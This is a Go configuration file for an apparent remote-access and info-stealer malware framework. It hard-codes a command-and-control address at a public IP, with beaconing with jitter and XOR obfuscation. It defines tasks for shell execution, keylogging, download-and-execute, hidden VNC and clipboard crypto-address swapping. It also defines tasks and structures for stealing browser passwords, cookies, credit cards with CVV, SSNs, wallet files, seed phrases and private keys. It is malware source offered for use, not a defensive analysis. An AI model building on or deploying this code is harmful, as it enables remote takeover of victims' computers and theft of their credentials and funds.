package config

import (
	"crypto/rand"
	"encoding/hex"
	"time"
)

// Server Configuration
const (
	// C2 Server Settings
	C2_SERVER_HOST = "0.0.0.0" // Listen on all interfaces for external access
	C2_SERVER_PORT = "8080"
	C2_BASE_URL    = "http://212.102.255.215:8080"

	// Telegram Bot Settings
	BOT_SERVER_HOST = "127.0.0.1"
	BOT_SERVER_PORT = "3001"

	// Agent Settings
	BEACON_INTERVAL    = 5 * time.Second // Reduced from 30s to 5s for faster response
	JITTER_PERCENTAGE  = 25              // 0-100% jitter for beacon timing
	MAX_RETRY_ATTEMPTS = 5
	RETRY_DELAY        = 5 * time.Second

	// Encryption
	XOR_KEY = 0x42

	// Endpoints
	ENDPOINT_REGISTER    = "/register"
	ENDPOINT_BEACON      = "/beacon"
	ENDPOINT_TASK        = "/task"
	ENDPOINT_RESULT      = "/result"
	ENDPOINT_HEALTH      = "/health"
	ENDPOINT_SCREENSHOTS = "/screenshots"
)

// Agent Status
const (
	STATUS_ACTIVE   = "active"
	STATUS_INACTIVE = "inactive"
	STATUS_DEAD     = "dead"
)

// Task Types
const (
	TASK_SHELL_COMMAND     = "shell"
	TASK_SCREENSHOT        = "screenshot"
	TASK_KEYLOG            = "keylog"
	TASK_DOWNLOAD_EXEC     = "download_exec"
	TASK_TERMINATE         = "terminate"
	TASK_CLIPBOARD_MONITOR = "clipboard_monitor"
	TASK_CLIPBOARD_READ    = "clipboard_read"
	TASK_CLIPBOARD_WRITE   = "clipboard_write"
	TASK_CLIPBOARD_REPLACE = "clipboard_replace"
	TASK_HVNC_START        = "hvnc_start"
	TASK_HVNC_STOP         = "hvnc_stop"
	TASK_HVNC_SCREENSHOT   = "hvnc_screenshot"
	TASK_HVNC_MOUSE        = "hvnc_mouse"
	TASK_HVNC_KEYBOARD     = "hvnc_keyboard"
	TASK_HVNC_EXECUTE      = "hvnc_execute"
	// New credential theft tasks
	TASK_STEAL_BROWSER_PASSWORDS  = "steal_browser_passwords"
	TASK_STEAL_BROWSER_COOKIES    = "steal_browser_cookies"
	TASK_STEAL_BROWSER_AUTOFILL   = "steal_browser_autofill"
	TASK_STEAL_DOCUMENT_PASSWORDS = "steal_document_passwords"
	TASK_STEAL_ALL_CREDENTIALS    = "steal_all_credentials"
	// Hot wallet theft tasks
	TASK_STEAL_HOT_WALLETS = "steal_hot_wallets"
	// New wallet theft tasks
	TASK_DETECT_WALLETS           = "detect_wallets"
	TASK_STEAL_WALLET_FILES       = "steal_wallet_files"
	TASK_STEAL_SEED_PHRASES       = "steal_seed_phrases"
	TASK_STEAL_PRIVATE_KEYS       = "steal_private_keys"
	TASK_MONITOR_WALLET_CLIPBOARD = "monitor_wallet_clipboard"
	TASK_STEAL_ALL_WALLETS        = "steal_all_wallets"
)

// Common Structures
type Agent struct {
	ID           string    `json:"id"`
	Hostname     string    `json:"hostname"`
	Username     string    `json:"username"`
	OS           string    `json:"os"`
	Architecture string    `json:"architecture"`
	PrivLevel    string    `json:"priv_level"`
	LastSeen     time.Time `json:"last_seen"`
	Status       string    `json:"status"`
	IPAddress    string    `json:"ip_address"`
	ProcessID    int       `json:"process_id"`
	ProcessName  string    `json:"process_name"`
}

// Crypto address replacement configuration
type CryptoAddresses struct {
	BTC            string `json:"btc,omitempty"`
	ETH            string `json:"eth,omitempty"`
	SOL            string `json:"sol,omitempty"`
	LTC            string `json:"ltc,omitempty"`
	XMR            string `json:"xmr,omitempty"`
	BCH            string `json:"bch,omitempty"`
	DOGE           string `json:"doge,omitempty"`
	DefaultAddress string `json:"default,omitempty"` // Fallback for any crypto if specific not set
}

// HVNC (Hidden VNC) Session Configuration
type HVNCSession struct {
	SessionID   string `json:"session_id"`
	DesktopName string `json:"desktop_name"`
	Active      bool   `json:"active"`
	Width       int    `json:"width"`
	Height      int    `json:"height"`
	ProcessID   int    `json:"process_id,omitempty"`
}

// HVNC Mouse Event
type HVNCMouseEvent struct {
	X      int    `json:"x"`
	Y      int    `json:"y"`
	Button string `json:"button"` // "left", "right", "middle"
	Action string `json:"action"` // "click", "double", "down", "up", "move"
}

// HVNC Keyboard Event
type HVNCKeyboardEvent struct {
	Key    string `json:"key"`
	Action string `json:"action"`         // "press", "down", "up", "type"
	Text   string `json:"text,omitempty"` // For typing text
}

// Credential theft data structures
type BrowserPassword struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
	Browser  string `json:"browser"`
	Profile  string `json:"profile,omitempty"`
}

type BrowserCookie struct {
	Host     string `json:"host"`
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	Expires  int64  `json:"expires"`
	Secure   bool   `json:"secure"`
	HttpOnly bool   `json:"http_only"`
	Browser  string `json:"browser"`
	Profile  string `json:"profile,omitempty"`
}

type AutofillData struct {
	Name        string `json:"name"`
	Email       string `json:"email"`
	Phone       string `json:"phone"`
	Address     string `json:"address"`
	City        string `json:"city"`
	State       string `json:"state"`
	ZipCode     string `json:"zip_code"`
	Country     string `json:"country"`
	CreditCard  string `json:"credit_card,omitempty"`
	ExpiryMonth string `json:"expiry_month,omitempty"`
	ExpiryYear  string `json:"expiry_year,omitempty"`
	CVV         string `json:"cvv,omitempty"`
	Browser     string `json:"browser"`
	Profile     string `json:"profile,omitempty"`
}

type DocumentPassword struct {
	FilePath       string   `json:"file_path"`
	FileName       string   `json:"file_name"`
	FileType       string   `json:"file_type"`
	Content        string   `json:"content"`
	Passwords      []string `json:"passwords"`
	EmailAddresses []string `json:"email_addresses"`
	CreditCards    []string `json:"credit_cards"`
	SSNs           []string `json:"ssns,omitempty"`
	PhoneNumbers   []string `json:"phone_numbers,omitempty"`
}

type StolenCredentials struct {
	BrowserPasswords []BrowserPassword  `json:"browser_passwords,omitempty"`
	BrowserCookies   []BrowserCookie    `json:"browser_cookies,omitempty"`
	AutofillData     []AutofillData     `json:"autofill_data,omitempty"`
	DocumentData     []DocumentPassword `json:"document_data,omitempty"`
	Timestamp        int64              `json:"timestamp"`
	AgentID          string             `json:"agent_id"`
}

// Wallet-related data structures
type DetectedWallet struct {
	Name        string   `json:"name"`
	Type        string   `json:"type"` // "desktop", "browser_extension", "mobile"
	Path        string   `json:"path"`
	Version     string   `json:"version,omitempty"`
	IsRunning   bool     `json:"is_running"`
	ProcessID   int      `json:"process_id,omitempty"`
	InstallDate string   `json:"install_date,omitempty"`
	DataPath    string   `json:"data_path,omitempty"`
	ConfigPath  string   `json:"config_path,omitempty"`
	BackupPaths []string `json:"backup_paths,omitempty"`
}

type WalletFile struct {
	WalletName   string `json:"wallet_name"`
	FilePath     string `json:"file_path"`
	FileName     string `json:"file_name"`
	FileType     string `json:"file_type"` // "wallet.dat", "keystore", "seed", "private_key", "config"
	FileSize     int64  `json:"file_size"`
	IsEncrypted  bool   `json:"is_encrypted"`
	Content      string `json:"content,omitempty"`
	Base64Data   string `json:"base64_data,omitempty"`
	LastModified string `json:"last_modified"`
}

type SeedPhrase struct {
	WalletName string   `json:"wallet_name"`
	Source     string   `json:"source"` // "file", "clipboard", "keylog", "memory"
	Words      []string `json:"words"`
	WordCount  int      `json:"word_count"`
	IsValid    bool     `json:"is_valid"`
	Timestamp  int64    `json:"timestamp"`
	Context    string   `json:"context,omitempty"`
}

type PrivateKey struct {
	WalletName string `json:"wallet_name"`
	Source     string `json:"source"`     // "file", "clipboard", "keylog", "memory"
	KeyType    string `json:"key_type"`   // "bitcoin", "ethereum", "solana", "unknown"
	KeyFormat  string `json:"key_format"` // "hex", "wif", "base58", "pem"
	PrivateKey string `json:"private_key"`
	PublicKey  string `json:"public_key,omitempty"`
	Address    string `json:"address,omitempty"`
	IsValid    bool   `json:"is_valid"`
	Timestamp  int64  `json:"timestamp"`
	Context    string `json:"context,omitempty"`
}

type WalletClipboardData struct {
	Content     string `json:"content"`
	DataType    string `json:"data_type"` // "seed_phrase", "private_key", "address", "transaction"
	WalletType  string `json:"wallet_type,omitempty"`
	IsValid     bool   `json:"is_valid"`
	Timestamp   int64  `json:"timestamp"`
	WindowTitle string `json:"window_title,omitempty"`
}

type StolenWalletData struct {
	DetectedWallets []DetectedWallet      `json:"detected_wallets,omitempty"`
	WalletFiles     []WalletFile          `json:"wallet_files,omitempty"`
	SeedPhrases     []SeedPhrase          `json:"seed_phrases,omitempty"`
	PrivateKeys     []PrivateKey          `json:"private_keys,omitempty"`
	ClipboardData   []WalletClipboardData `json:"clipboard_data,omitempty"`
	Timestamp       int64                 `json:"timestamp"`
	AgentID         string                `json:"agent_id"`
}

// Hot wallet data structures for comprehensive wallet theft
type HotWalletFile struct {
	WalletName   string `json:"wallet_name"`
	WalletType   string `json:"wallet_type"`
	FilePath     string `json:"file_path"`
	FileName     string `json:"file_name"`
	FileSize     int64  `json:"file_size"`
	FileContent  string `json:"file_content,omitempty"` // Base64 encoded for binary files
	IsEncrypted  bool   `json:"is_encrypted"`
	Description  string `json:"description"`
	LastModified int64  `json:"last_modified"`
}

type HotWalletInfo struct {
	WalletName      string          `json:"wallet_name"`
	WalletType      string          `json:"wallet_type"`
	InstallPath     string          `json:"install_path"`
	IsInstalled     bool            `json:"is_installed"`
	IsRunning       bool            `json:"is_running"`
	ProcessID       int             `json:"process_id,omitempty"`
	Version         string          `json:"version,omitempty"`
	DataDirectory   string          `json:"data_directory"`
	ConfigFiles     []HotWalletFile `json:"config_files"`
	WalletFiles     []HotWalletFile `json:"wallet_files"`
	KeystoreFiles   []HotWalletFile `json:"keystore_files"`
	BackupFiles     []HotWalletFile `json:"backup_files"`
	LogFiles        []HotWalletFile `json:"log_files"`
	TotalFilesFound int             `json:"total_files_found"`
	TotalSizeBytes  int64           `json:"total_size_bytes"`
}

type StolenWallets struct {
	DetectedWallets []HotWalletInfo `json:"detected_wallets"`
	TotalWallets    int             `json:"total_wallets"`
	TotalFiles      int             `json:"total_files"`
	TotalSizeBytes  int64           `json:"total_size_bytes"`
	Timestamp       int64           `json:"timestamp"`
	AgentID         string          `json:"agent_id"`
	DownloadURL     string          `json:"download_url,omitempty"`
}

// Task represents a command to be executed by an agent
type Task struct {
	ID           string                 `json:"id"`
	AgentID      string                 `json:"agent_id"`
	Type         string                 `json:"type"`
	Command      string                 `json:"command,omitempty"`
	Parameters   map[string]interface{} `json:"parameters,omitempty"`
	CryptoAddrs  *CryptoAddresses       `json:"crypto_addresses,omitempty"`
	HVNCSession  *HVNCSession           `json:"hvnc_session,omitempty"`
	HVNCMouse    *HVNCMouseEvent        `json:"hvnc_mouse,omitempty"`
	HVNCKeyboard *HVNCKeyboardEvent     `json:"hvnc_keyboard,omitempty"`
	Status       string                 `json:"status"`
	CreatedAt    time.Time              `json:"created_at"`
	CompletedAt  *time.Time             `json:"completed_at,omitempty"`
	Result       string                 `json:"result"`
	Error        string                 `json:"error,omitempty"`
}

type BeaconRequest struct {
	AgentID   string `json:"agent_id"`
	Timestamp int64  `json:"timestamp"`
}

type BeaconResponse struct {
	HasTask bool   `json:"has_task"`
	TaskID  string `json:"task_id,omitempty"`
	Task    *Task  `json:"task,omitempty"`
}

type TaskResult struct {
	TaskID          string             `json:"task_id"`
	AgentID         string             `json:"agent_id"`
	Success         bool               `json:"success"`
	Output          string             `json:"output"`
	Error           string             `json:"error,omitempty"`
	Timestamp       int64              `json:"timestamp"`
	ScreenshotData  string             `json:"screenshot_data,omitempty"`
	CredentialData  *StolenCredentials `json:"credential_data,omitempty"`
	CredentialFiles map[string]string  `json:"credential_files,omitempty"`
	WalletData      *StolenWallets     `json:"wallet_data,omitempty"`
	WalletFiles     map[string]string  `json:"wallet_files,omitempty"`
}

// Utility Functions
func GenerateID() string {
	bytes := make([]byte, 16)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func XOREncrypt(data []byte, key byte) []byte {
	encrypted := make([]byte, len(data))
	for i, b := range data {
		encrypted[i] = b ^ key
	}
	return encrypted
}

func XORDecrypt(data []byte, key byte) []byte {
	return XOREncrypt(data, key) // XOR is symmetric
}

func CalculateJitter(baseInterval time.Duration, jitterPercent int) time.Duration {
	if jitterPercent <= 0 || jitterPercent > 100 {
		return baseInterval
	}

	jitterBytes := make([]byte, 4)
	rand.Read(jitterBytes)

	// Convert to percentage of jitter
	jitterAmount := float64(int(jitterBytes[0])%jitterPercent) / 100.0
	jitterDuration := time.Duration(float64(baseInterval) * jitterAmount)

	// Add or subtract jitter
	if jitterBytes[1]%2 == 0 {
		return baseInterval + jitterDuration
	}
	return baseInterval - jitterDuration
}
